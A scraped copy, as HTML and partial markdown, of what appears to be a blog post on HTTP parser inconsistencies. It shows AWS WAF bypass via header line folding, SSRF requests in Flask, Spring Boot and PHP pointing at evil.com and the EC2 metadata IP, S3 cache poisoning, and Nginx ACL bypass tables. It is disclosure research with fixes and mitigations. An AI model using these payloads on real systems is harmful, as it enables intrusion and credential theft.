vulnerabilities.\u003c/p\u003e\n\u003cp\u003eFor example, the header \u003ccode\u003e1337: Value\\r\\n\\t1337\u003c/code\u003e in the following request will be interpreted as \u003ccode\u003e1337: Value\\t1337\u003c/code\u003e in the Node.js server:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"lang-http\"\u003e\u003cspan class=\"hljs-keyword\"\u003eGET\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e/\u003c/span\u003e HTTP/1.1\n\u003cspan class=\"hljs-attribute\"\u003eHost\u003c/span\u003e: target.com\n\u003cspan class=\"hljs-attribute\"\u003e1337\u003c/span\u003e: Value\n    1337\n\u003cspan class=\"hljs-attribute\"\u003eConnection\u003c/span\u003e: close\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eKnowing it, I discovered that it's possible to bypass the AWS WAF by using line folding behavior.\u003c/p\u003e\n\u003cp\u003eUsing the same AWS WAF that protects the \u003ccode\u003eX-Query\u003c/code\u003e from SQL Injection payloads, the following HTTP request was used to confirm that the Node.js server received the payload \u003ccode\u003e' or '1'='1' --\u003c/code\u003e in the \u003ccode\u003eX-Query\u003c/code\u003e header.\u003c/p\u003e\n\u003cp\u003eBelow is a graphical example of how the applications interpret the HTTP request header with line folding:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686765599948/440f51b0-18bb-451c-92da-3428000cd7f0.png\" alt class=\"image--center mx-auto\" /\u003e\u003c/p\u003e\n\u003cp\u003eFor the exploitation scenario, let's take the following Node.js source code as a reference. It will return the requested headers as a Json:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"lang-javascript\"\u003eapp.get(\u003cspan class=\"hljs-string\"\u003e'/*'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ereq, res\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n    res.send(req.headers);\n});\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eBelow is an example of an exploitation request:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"lang-http\"\u003e\u003cspan class=\"hljs-attribute\"\u003eGET / HTTP/1.1\\r\\n\nHost\u003c/span\u003e: target.com\\r\\n\n\u003cspan class=\"hljs-attribute\"\u003eX-Query\u003c/span\u003e: Value\\r\\n\n\\t' or '1'='1' -- \\r\\n\n\u003cspan class=\"hljs-attribute\"\u003eConnection\u003c/span\u003e: close\\r\\n\n\\r\\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686765362775/dbd69c56-503e-45bb-ada6-358d3d987ede.png\" alt class=\"image--center mx-auto\" /\u003e\u003c/p\u003e\n\u003cp\u003eIn the provided screenshot, it is evident that the Node.js application interpreted the characters \u003ccode\u003e' or '1'='1' --\u003c/code\u003e as the value for the \u003ccode\u003eX-Query\u003c/code\u003e header. However, the AWS WAF treated it as a header name instead.\u003c/p\u003e\n\u003cp\u003eThis bypass technique was reported to the AWS security team and fixed in 2022.\u003c/p\u003e\n\u003ch1 id=\"heading-incorrect-path-parsing-leads-to-server-side-request-forgery\"\u003eIncorrect Path Parsing Leads to Server-Side Request Forgery\u003c/h1\u003e\n\u003cp\u003eIn the previous sections, I provided reasons to be cautious about trusting reverse proxies. However, in this section, I will demonstrate why utilizing a reverse proxy can be advantageous...\u003c/p\u003e\n\u003cp\u003eIn this section, I will leverage an incorrect pathname interpretation to exploit a Server-Side Request Forgery vulnerability in popular servers and frameworks such as Spring Boot, Flask, and PHP.\u003c/p\u003e\n\u003cp\u003eNormally, a valid HTTP pathname starts with \u003ccode\u003e/\u003c/code\u003e or \u003ccode\u003ehttp(s)://domain/\u003c/code\u003e, but the majority of the popular WEB servers do not verify it correctly, which can lead to a security risk.\u003c/p\u003e\n\u003ch2 id=\"heading-ssrf-on-flask-through-incorrect-pathname-interpretation\"\u003eSSRF on Flask Through Incorrect Pathname Interpretation\u003c/h2\u003e\n\u003cp\u003eFlask is a lightweight web framework for Python, and it offers a straightforward and flexible approach to web development.\u003c/p\u003e\n\u003cp\u003eAfter conducting tests on Flask's pathname parsing, I discovered that it accepts certain characters that it shouldn't. As an example, the following HTTP request, which should be considered invalid, is surprisingly treated as valid by the framework, but the server responds \u003ccode\u003e404 Not Found\u003c/code\u003e:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"lang-http\"\u003e\u003cspan class=\"hljs-keyword\"\u003eGET\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e@/\u003c/span\u003e HTTP/1.1\n\u003cspan class=\"hljs-attribute\"\u003eHost\u003c/span\u003e: target.com\n\u003cspan class=\"hljs-attribute\"\u003eConnection\u003c/span\u003e: close\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhile investigating how this behavior can potentially result in a security vulnerability, I came across a helpful \u003ca target=\"_blank\" href=\"https://medium.com/@zwork101/making-a-flask-proxy-server-online-in-10-lines-of-code-44b8721bca6\"\u003eMedium blog post\u003c/a\u003e that demonstrates the creation of a proxy using the Flask framework. Below is an example of the code provided in the blog post:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"lang-python\"\u003e\u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e flask \u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e Flask\n\u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e requests \u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e get\n\napp = Flask(\u003cspan class=\"hljs-string\"\u003e'__main__'\u003c/span\u003e)\nSITE_NAME = \u003cspan class=\"hljs-string\"\u003e'https://google.com/'\u003c/span\u003e\n\n\u003cspan class=\"hljs-meta\"\u003e@app.route('/', defaults={'path': ''})\u003c/span\u003e\n\u003cspan class=\"hljs-meta\"\u003e@app.route('/\u0026lt;path:path\u0026gt;')\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eproxy\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003epath\u003c/span\u003e):\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e get(\u003cspan class=\"hljs-string\"\u003ef'\u003cspan class=\"hljs-subst\"\u003e{SITE_NAME}\u003c/span\u003e\u003cspan class=\"hljs-subst\"\u003e{path}\u003c/span\u003e'\u003c/span\u003e).content\n\napp.run(host=\u003cspan class=\"hljs-string\"\u003e'0.0.0.0'\u003c/span\u003e, port=\u003cspan class=\"hljs-number\"\u003e8080\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eMy first thought was: \"\u003cem\u003eWhat if the developer forgets to add the last slash in the\u003c/em\u003e \u003ccode\u003eSITE_NAME\u003c/code\u003e \u003cem\u003evariable?\u003c/em\u003e\". And yes, it can lead to an SSRF.\u003c/p\u003e\n\u003cp\u003eSince Flask also allows any ASCII character after the \u003ccode\u003e@\u003c/code\u003e, it's possible to fetch an arbitrary domain after concatenating the malicious pathname and the destination server.\u003c/p\u003e\n\u003cp\u003ePlease consider the following source code as a reference for the exploitation scenario:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"lang-python\"\u003e\u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e flask \u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e Flask\n\u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e requests \u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e get\n\napp = Flask(\u003cspan class=\"hljs-string\"\u003e'__main__'\u003c/span\u003e)\nSITE_NAME = \u003cspan class=\"hljs-string\"\u003e'https://google.com'\u003c/span\u003e\n\n\u003cspan class=\"hljs-meta\"\u003e@app.route('/', defaults={'path': ''})\u003c/span\u003e\n\u003cspan class=\"hljs-meta\"\u003e@app.route('/\u0026lt;path:path\u0026gt;')\u003c/span\u003e\n\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eproxy\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003epath\u003c/span\u003e):\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e get(\u003cspan class=\"hljs-string\"\u003ef'\u003cspan class=\"hljs-subst\"\u003e{SITE_NAME}\u003c/span\u003e\u003cspan class=\"hljs-subst\"\u003e{path}\u003c/span\u003e'\u003c/span\u003e).content\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e __name__ == \u003cspan class=\"hljs-string\"\u003e\"__main__\"\u003c/span\u003e:\n    app.run(threaded=\u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003ePresented below is an example of an exploitation request:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"lang-http\"\u003e\u003cspan class=\"hljs-keyword\"\u003eGET\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e@evildomain.com/\u003c/span\u003e HTTP/1.1\n\u003cspan class=\"hljs-attribute\"\u003eHost\u003c/span\u003e: target.com\n\u003cspan class=\"hljs-attribute\"\u003eConnection\u003c/span\u003e: close\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIn the following example, I was able to fetch my EC2 metadata:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686771183056/fe166abf-b2cb-41be-846b-11ac56b33d71.png\" alt class=\"image--center mx-auto\" /\u003e\u003c/p\u003e\n\u003ch2 id=\"heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation\"\u003eSSRF on Spring Boot Through Incorrect Pathname Interpretation\u003c/h2\u003e\n\u003cp\u003eUpon discovering the presence of an SSRF vulnerability in Flask, I delved into exploring how this behavior could be exploited in other frameworks. As my research progressed, it became apparent that Spring Boot is also susceptible to this particular issue.\u003c/p\u003e\n\u003cp\u003eAuthentication bypasses, ACL bypasses, and path traversal are known vectors when the application parses Matrix parameters. Servlet matrix parameters are a feature introduced in the Servlet specification that allows you to extract and handle additional data present in the URL path. Unlike query parameters that are separated by the \u003ccode\u003e?\u003c/code\u003e character, matrix parameters are separated by the \u003ccode\u003e;\u003c/code\u003e character within the URL.\u003c/p\u003e\n\u003cp\u003eDuring the research, I discovered that the Spring framework accepts the matrix parameter separator character \u003ccode\u003e;\u003c/code\u003e before the first slash of the HTTP pathname:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"lang-http\"\u003e\u003cspan class=\"hljs-keyword\"\u003eGET\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e;1337/api/v1/me\u003c/span\u003e HTTP/1.1\n\u003cspan class=\"hljs-attribute\"\u003eHost\u003c/span\u003e: target.com\n\u003cspan class=\"hljs-attribute\"\u003eConnection\u003c/span\u003e: close\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIf a developer implements a server-side request that utilizes the complete pathname of the request to fetch an endpoint, it can lead to the emergence of Server-Side Request Forgery (SSRF).\u003c/p\u003e\n\u003cp\u003ePlease consider the following source code as a reference for the exploitation scenario:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686772007869/5661fff8-9e48-4c63-b78b-cb69ee0582c0.png\" alt class=\"image--center mx-auto\" /\u003e\u003c/p\u003e\n\u003cp\u003eThe code snippet above utilizes the \u003ccode\u003eHttpServletRequest\u003c/code\u003e API to retrieve the requested URL through the \u003ccode\u003egetRequestURI()\u003c/code\u003e function. Subsequently, it concatenates the requested URI with the destination endpoint http://ifconfig.me.\u003c/p\u003e\n\u003cp\u003eConsidering that Spring permits any character following the Matrix parameter separator, becoming possible to use the \u003ccode\u003e@\u003c/code\u003e character to fetch an arbitrary endpoint as well.\u003c/p\u003e\n\u003cp\u003eBelow is an example of the exploit request:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"lang-http\"\u003e\u003cspan class=\"hljs-keyword\"\u003eGET\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e;@evil.com/url\u003c/span\u003e HTTP/1.1\n\u003cspan class=\"hljs-attribute\"\u003eHost\u003c/span\u003e: target.com\n\u003cspan class=\"hljs-attribute\"\u003eConnection\u003c/span\u003e: close\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686772361453/e66a9edf-a590-4d82-b75a-180c33ae1a21.png\" alt class=\"image--center mx-auto\" /\u003e\u003c/p\u003e\n\u003ch2 id=\"heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation\"\u003ePHP Built-in Web Server Case Study - SSRF Through Incorrect Pathname Interpretation\u003c/h2\u003e\n\u003cp\u003eThe PHP Built-in web server suffers from the same vulnerability. Still, the Built-in server is not used in production involvements, so I decided to present this behavior as a case study that is unlikely to happen in real-world applications.\u003c/p\u003e\n\u003cp\u003eSurprisingly, PHP allows the asterisk \u003ccode\u003e*\u003c/code\u003e character before the first slash in the pathname, and between the asterisk and the first slash, almost all ASCII characters are accepted as valid HTTP request.\u003c/p\u003e\n\u003cp\u003eHowever, there are two limitations that arise with PHP:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cp\u003eThis technique can only be used for the root pathname \u003ccode\u003e/\u003c/code\u003e and cannot be applied to other endpoints, in other words, the vulnerable code must be in the \u003ccode\u003eindex.php\u003c/code\u003e file;\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eDots \u003ccode\u003e.\u003c/code\u003e are not allowed before the first slash, which restricts the inclusion of arbitrary IPs and domains, to circumvent it, the payload must include a dotless-hex encoded IP address of the malicious domain.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eLet's consider the following PHP code for this exploitation scenario:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"lang-php\"\u003e\u003cspan class=\"hljs-meta\"\u003e\u0026lt;?php\u003c/span\u003e\n$site = \u003cspan class=\"hljs-string\"\u003e\"http://ifconfig.me\"\u003c/span\u003e;\n$current_uri = $_SERVER[\u003cspan class=\"hljs-string\"\u003e'REQUEST_URI'\u003c/span\u003e];\n\n$proxy_site = $site.$current_uri;\nvar_dump($proxy_site);\n\n\u003cspan class=\"hljs-keyword\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\\n\\n\"\u003c/span\u003e;\n\n$response = file_get_contents($proxy_site);\nvar_dump($response);\n\u003cspan class=\"hljs-meta\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe provided code retrieves the HTTP request pathname using \u003ccode\u003e$_SERVER['REQUEST_URI']\u003c/code\u003e and concatenates it with the destination domain.\u003c/p\u003e\n\u003cp\u003eFor performing IP address dotless-hex encoding, you can utilize the tool \u003ca target=\"_blank\" href=\"https://gist.github.com/mhmdiaa/2587e2330b87db99c81ace2a190e235f\"\u003eip-encoder.py\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eThe resulting payload used for exploiting which fetches the EC2 metadata is as follows:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"lang-http\"\u003e\u003cspan class=\"hljs-keyword\"\u003eGET\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e*@0xa9fea9fe/\u003c/span\u003e HTTP/1.1\n\u003cspan class=\"hljs-attribute\"\u003eHost\u003c/span\u003e: target.com\n\u003cspan class=\"hljs-attribute\"\u003eConnection\u003c/span\u003e: close\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIn the following proof of concept, I successfully retrieved my EC2 metadata:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686789542807/4ca585ed-37e3-4384-bec0-ba2c6e59e75a.png\" alt class=\"image--center mx-auto\" /\u003e\u003c/p\u003e\n\u003ch2 id=\"heading-how-to-prevent-1\"\u003eHow to prevent\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cp\u003eIt is essential to consistently employ complete URL domains when concatenating them with user input. For instance, ensure that a trailing slash is added after the domain name, such as \u003ccode\u003ehttp://ifconfig.me/\u003c/code\u003e.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eUtilizing a reverse proxy that effectively handles HTTP requests. The vulnerabilities mentioned are typically only possible if the framework is used without any additional reverse proxy that verifies the HTTP pathname. In other words, incorporating a reverse proxy can significantly enhance the security of the web application.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1 id=\"heading-http-desync-cache-poisoning-attacks\"\u003eHTTP Desync Cache Poisoning Attacks\u003c/h1\u003e\n\u003cp\u003eInconsistencies exist among servers and reverse proxies when it comes to removing invalid invisible characters from header names before interpreting them. This inconsistency can lead to notable vulnerabilities, such as HTTP Request Smuggling. But in this section, I will discuss a vulnerability and technique that I discovered during my research that combines Desync attacks with Cache Poisoning, which affects cache servers when integrated with AWS S3 buckets.\u003c/p\u003e\n\u003cp\u003eBut before we continue, we must understand some functionalities of cache servers.\u003c/p\u003e\n\u003ch2 id=\"heading-cache-keys\"\u003eCache Keys\u003c/h2\u003e\n\u003cp\u003eCache keys are unique identifiers used by cache servers to store and retrieve cached data, they serve as references or labels that allow access to cached content.\u003c/p\u003e\n\u003cp\u003eThe most frequently used cache key is typically derived from the URL's pathname. When a user sends a request to a server that utilizes caching, the cache server employs the requested URL to locate the corresponding cached response to serve back to the user.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686943618847/430c595b-b7ca-4dec-b31c-58374b1d0a30.webp\" alt class=\"image--center mx-auto\" /\u003e\u003c/p\u003e\n\u003cp\u003eIn addition to the URL's pathname, another default cache key is the Host header. Let's consider a scenario where a cached JavaScript file is located at \u003ccode\u003ehttps://target.com/static/main.js\u003c/code\u003e. When a user sends an HTTP request to this cached URL, the cache server will return the stored response without having to forward the request to the backend server.\u003c/p\u003e\n\u003cp\u003eHowever, if a user sends an HTTP request to the same endpoint but modifies the Host header to \u003ccode\u003e1337.target.com\u003c/code\u003e, the cache server will attempt to retrieve the backend of the corresponding response for the \u003ccode\u003e/static/main.js\u003c/code\u003e URL using the \u003ccode\u003e1337.target.com\u003c/code\u003e host header. Subsequently, it will generate a stored response specifically for that particular HTTP message.\u003c/p\u003e\n\u003ch2 id=\"heading-s3-http-desync-cache-poisoning-issue\"\u003eS3 HTTP Desync Cache Poisoning Issue\u003c/h2\u003e\n\u003cp\u003eIn this section, I will demonstrate an HTTP Desync vulnerability that can result in Cache Poisoning, impacting principally AWS S3 buckets.\u003c/p\u003e\n\u003cp\u003eIn the Amazon AWS S3 buckets, the Host header plays a crucial role in routing requests to the correct bucket and enabling proper access to the stored content. When interacting with an S3 bucket, the Host header helps direct requests to the appropriate endpoint within the AWS infrastructure.\u003c/p\u003e\n\u003cp\u003eWhen a request is made to an S3 bucket, the AWS infrastructure inspects the Host header to determine the target bucket. So if a user sends an HTTP request to the domain \u003ccode\u003eyour.s3.amazonaws.com\u003c/code\u003e but changes the host header to \u003ccode\u003emy.s3.amazonaws.com\u003c/code\u003e, internally, AWS will \"ignore\" the domain name, fetching the bucket specified in the host header only. This is a common practice on Cloud services.\u003c/p\u003e\n\u003ch3 id=\"heading-the-vulnerability\"\u003eThe Vulnerability\u003c/h3\u003e\n\u003cp\u003eThe interpretation of host headers for S3 buckets involves two key aspects:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cp\u003eWhen multiple host headers are included in the request, only the first one will be taken, and any additional headers will be ignored.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eThe following bytes are ignored if present in the header name: \u003ccode\u003e\\x1f\u003c/code\u003e, \u003ccode\u003e\\x1d\u003c/code\u003e, \u003ccode\u003e\\x0c\u003c/code\u003e, \u003ccode\u003e\\x1e\u003c/code\u003e, \u003ccode\u003e\\x1c\u003c/code\u003e, \u003ccode\u003e\\x0b\u003c/code\u003e;\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThe vulnerability arises from an inconsistency in the host header interpretation. If the cache server mistakenly includes the ignored bytes as part of the header name, treating it as an invalid host header, while S3 interprets it as a valid host header, it becomes possible to cache arbitrary bucket responses on vulnerable websites.\u003c/p\u003e\n\u003cp\u003eThis behavior allows caching arbitrary S3 bucket content in vulnerable websites.\u003c/p\u003e\n\u003cp\u003eConsider the following exploitation request:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686958907855/ffd360e3-5eb8-4ffd-939d-b46614f9f430.png\" alt class=\"image--center mx-auto\" /\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"lang-http\"\u003e\u003cspan class=\"hljs-keyword\"\u003eGET\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e/\u003c/span\u003e HTTP/1.1\n[\\x1d]Host: evilbucket.com\n\u003cspan class=\"hljs-attribute\"\u003eHost\u003c/span\u003e: example.bucket.com\n\u003cspan class=\"hljs-attribute\"\u003eConnection\u003c/span\u003e: close\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cp\u003eFirst, the cache server examines the header \u003ccode\u003e\\x1dHost: evilbucket.com\u003c/code\u003e and treats it like any other unkeyed header;\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eSubsequently, the cache server will correctly interpret the \u003ccode\u003eexample.bucket.com\u003c/code\u003e header as a valid host header, resulting in the final cache response being associated with this host value.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eUpon reaching the S3 bucket, the header \u003ccode\u003e\\x1dHost: evilbucket.com\u003c/code\u003e will be mistakenly interpreted as a valid host header, while the intended \u003ccode\u003eHost: example.bucket.com\u003c/code\u003e header will be ignored. This misinterpretation by AWS will lead to the fetching of the malicious header's associated bucket.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThe final result is a complete cache poisoning of the page with arbitrary content.\u003c/p\u003e\n\u003cp\u003eThe proof of concept video demonstrates the exploitation of this vulnerability in an outdated Varnish cache server. It is important to note that newer versions of Varnish are not susceptible to this vulnerability:\u003c/p\u003e\n\u003cdiv class=\"embed-wrapper\"\u003e\u003cdiv class=\"embed-loading\"\u003e\u003cdiv class=\"loadingRow\"\u003e\u003c/div\u003e\u003cdiv class=\"loadingRow\"\u003e\u003c/div\u003e\u003c/div\u003e\u003ca class=\"embed-card\" href=\"https://www.youtube.com/watch?v=dnf6Zi5eNW8\"\u003ehttps://www.youtube.com/watch?v=dnf6Zi5eNW8\u003c/a\u003e\u003c/div\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cp\u003eIn addition to Varnish, other cache servers such as Akamai were also vulnerable to this issue. However, it's important to note that this vulnerability has been addressed and cannot be reproduced on any AWS service today.\u003c/p\u003e\n\u003ch1 id=\"heading-conclusion\"\u003eConclusion\u003c/h1\u003e\n\u003cp\u003eIn conclusion, this research delved into the realm of security vulnerabilities in web applications, specifically focusing on HTTP parsers and the implications they can have on overall security. By exploring inconsistencies in HTTP parsers across various technologies, such as load balancers, reverse proxies, web servers, and caching servers, I unveiled potential avenues for exploitation.\u003c/p\u003e\n\u003cp\u003eI demonstrated how certain behaviors, like path normalization and the acceptance of special characters, can lead to bypassing security rules and even opening the door to Server-Side Request Forgery (SSRF) and Cache Poisoning vulnerabilities.\u003c/p\u003e\n\u003cp\u003eMoreover, I highlighted the significance of utilizing reverse proxies that effectively validate and sanitize HTTP requests. Implementing a robust reverse proxy can significantly bolster the security posture of a web application by intercepting and filtering malicious requests before they reach the backend servers.\u003c/p\u003e\n","markdown":"The HTTP protocol plays a vital role in the seamless functioning of web applications, however, the implementation of HTTP parsers across different technologies can introduce subtle discrepancies, leading to potential security loopholes.\n\nIn this research, my focus revolves around the discovery of inconsistencies within HTTP parsers across various web technologies, including load balancers, reverse proxies, web servers, and caching servers. By investigating these disparities, I aim to shed light on potential new vulnerabilities that involve HTTP Desync attacks.\n\nIt was my first security research, I started on this journey in December 2021 and concluded in April 2022. I tried to be creative in finding new attack vectors due to incorrect HTTP parsing. In this post, I will share the final results of this study.\n\n# Pathname Manipulation: Bypassing Reverse Proxies and Load Balancers Security Rules\n\nThis section of the research focuses on the exploitable vulnerabilities arising from pathname manipulation in web servers, principally about the use of `trim()` or `strip()` functions. By exploiting these techniques, attackers can circumvent security rules specific to certain paths in reverse proxies and load balancers, posing a significant threat to web application security.\n\nIn this section, we delve into the intricacies of how web servers process and manipulate pathnames, investigating the impact of the removal of certain characters, which can lead to unintended behaviors.\n\n## Nginx ACL Rules\n\nNginx is a powerful web server and reverse proxy which allows developers to apply security rules on HTTP requests. This section explores security threads of the capabilities of Nginx in rewriting or blocking HTTP messages, with a primary focus on rules triggered by specific strings or regular expressions found within the HTTP pathname section.\n\nIn Nginx, the \"location\" rule enables developers to define specific directives and behaviors based on the requested URL. This rule acts as a key component in routing and processing incoming HTTP requests, allowing control over how different URLs are handled.\n\n```plaintext\nlocation = /admin {\n    deny all;\n}\n\nlocation = /admin/ {\n    deny all;\n}\n```\n\nThe above Nginx rule aims to deny every access to the `/admin` endpoint, so if a user tries to access this endpoint, Nginx will return `403` and will not pass the HTTP message to the web server.\n\nTo prevent security issues on URI-based rules, Nginx performs path normalization before checking them. Path normalization in Nginx refers to the process of transforming and standardizing requested URLs to a consistent and canonical format before handling them. It involves removing redundant or unnecessary elements from the URL path, such as extra slashes, dot segments, processing path traversal, and URL-encoded characters, to ensure uniformity and proper routing within the web server.\n\n## Trim Inconsistencies\n\nBefore we proceed, we need to understand what the `trim()` function does in different languages.\n\nDifferent languages remove different characters when the correspondent function for `trim()` is called. Each server will normalize the pathname based on its `trim()`, removing different characters. But Nginx which is written in C, does not cover all characters for all languages.\n\nE.g.: Python removes the character `\\x85` with `strip()`, and JavaScript does not with `trim()`.\n\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686750781066/bf6a391a-2bf5-4605-9e5e-8cc0f059a995.png align=\"center\")\n\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686750895455/784cf8a4-b070-4bb6-abd0-12ae887d568c.png align=\"center\")\n\nIf an HTTP message is parsed using the `trim()` function in different languages, an HTTP Desync attack can occur.\n\n## Bypassing Nginx ACL Rules With Node.js\n\nLet's consider the following Nginx ACL rule and Node.js API source code using Express:\n\n```plaintext\nlocation = /admin {\n    deny all;\n}\n\nlocation = /admin/ {\n    deny all;\n}\n```\n\n```javascript\napp.get('/admin', (req, res) =\u003e {\n    return res.send('ADMIN');\n});\n```\n\nFollowing the `trim()` logic, Node.js \"ignores\" the characters `\\x09`, `\\xa0`, and `\\x0c` from the pathname, but Nginx considers them as part of the URL:\n\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686751453300/0531fc1a-9599-4a00-aa94-21cca2db557c.png align=\"center\")\n\n* First, Nginx receives the HTTP request and performs path normalization on the pathname;\n    \n* As Nginx includes the character `\\xa0` as part of the pathname, the ACL rule for the `/admin` URI will not be triggered. Consequently, Nginx will forward the HTTP message to the backend;\n    \n* When the URI `/admin\\x0a` is received by the Node.js server, the character `\\xa0` will be removed, allowing successful retrieval of the `/admin` endpoint.\n    \n\nBelow is a graphical demonstration of what happens with the HTTP request:\n\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686752151660/84ec1c49-2df9-4a44-ab01-1d798ef0564f.png align=\"center\")\n\nTo gain a clearer understanding of how this vulnerability can be exploited, I recommend watching the accompanying proof of concept video below:\n\n%[https://www.youtube.com/watch?v=sgs3s5oTfz8] \n\nBelow is a table correlating Nginx versions with characters that can potentially lead to bypassing URI ACL rules when using Node.js as the backend:\n\n| Nginx Version | **Node.js Bypass Characters** |\n| --- | --- |\n| 1.22.0 | `\\xA0` |\n| 1.21.6 | `\\xA0` |\n| 1.20.2 | `\\xA0`, `\\x09`, `\\x0C` |\n| 1.18.0 | `\\xA0`, `\\x09`, `\\x0C` |\n| 1.16.1 | `\\xA0`, `\\x09`, `\\x0C` |\n\n## Bypassing Nginx ACL Rules With Flask\n\nFlask removes the characters `\\x85`, `\\xA0`, `\\x1F`, `\\x1E`, `\\x1D`, `\\x1C`, `\\x0C`, `\\x0B`, and `\\x09` from the URL path, but NGINX doesn't.\n\nTake the following nginx configuration/API source code as a reference:\n\n```plaintext\nlocation = /admin {\n    deny all;\n}\n\nlocation = /admin/ {\n    deny all;\n}\n```\n\n```python\n@app.route('/admin', methods = ['GET'])\ndef admin():\n    data = {\"url\":request.url, \"admin\":\"True\"}\n\n    return Response(str(data), mimetype=\"application/json\")\n```\n\nAs you can see below, it's possible to circumvent the ACL protection by adding the character `\\x85` at the end of the pathname:\n\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686753386536/4032be9b-c7f3-48ae-8074-5d9ad1f9e7a5.png align=\"center\")\n\n| Nginx Version | **Flask Bypass Characters** |\n| --- | --- |\n| 1.22.0 | `\\x85`, `\\xA0` |\n| 1.21.6 | `\\x85`, `\\xA0` |\n| 1.20.2 | `\\x85`, `\\xA0`, `\\x1F`, `\\x1E`, `\\x1D`, `\\x1C`, `\\x0C`, `\\x0B` |\n| 1.18.0 | `\\x85`, `\\xA0`, `\\x1F`, `\\x1E`, `\\x1D`, `\\x1C`, `\\x0C`, `\\x0B` |\n| 1.16.1 | 